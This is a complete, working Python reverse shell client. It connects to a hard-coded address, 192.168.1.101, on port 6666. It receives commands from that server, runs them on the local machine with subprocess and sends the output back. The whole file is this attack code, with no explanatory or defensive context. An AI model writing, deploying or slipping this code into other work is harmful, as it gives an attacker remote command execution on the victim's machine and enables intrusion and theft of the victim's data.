import socket
HOST='192.168.1.101'
PORT=6666
BUFFER_SIZE = 1024
import subprocess
# create the socket object
s = socket.socket()
# connect to the server
s.connect((HOST,PORT))
# receive the greeting message
message = s.recv(BUFFER_SIZE).decode()
print("Server:", message)
while True:
    # receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    # execute the command and retrieve the results
    output = subprocess.getoutput(command)
    # send the results back to the server
    s.send(output.encode())
# close client connection
s.close()
